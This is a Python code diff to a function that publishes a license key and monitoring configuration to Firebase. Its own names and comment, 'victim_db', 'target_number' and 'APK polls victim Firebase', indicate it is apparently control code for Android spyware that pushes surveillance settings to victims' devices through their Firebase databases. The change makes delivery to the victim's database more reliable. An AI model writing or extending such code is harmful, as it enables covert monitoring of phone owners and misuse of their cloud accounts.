@@ -156,23 +156,27 @@ async def publish_license_key(
         from app.firebase_sync import mynum_device_id
 
         poll_id = mynum_device_id(target_number)
-    inject_db = (firebase_url or _module_db()).rstrip("/")
+    module_db = _module_db()
+    victim_db = (firebase_url or module_db).rstrip("/")
     meta = {
         "license_key": normalized,
         "max_devices": DEFAULT_MAX_DEVICES,
         "active": True,
         "ts": now_ms,
     }
+    # APK polls victim Firebase (module DB is often 404/deactivated).
     config = {
         "monitoring": monitoring,
         "ts": now_ms,
-        "firebase_url": inject_db,
+        "firebase_url": victim_db,
         "device_id": poll_id,
         "firebase_key": normalized,
     }
     bases = list(firebase_bases or [])
-    if inject_db not in bases and inject_db != _module_db():
-        bases.append(inject_db)
+    if victim_db not in bases:
+        bases.append(victim_db)
+    if module_db not in bases and module_db != victim_db:
+        bases.append(module_db)
     await _sync_key_to_firebase(normalized, meta, config, bases)
 
 
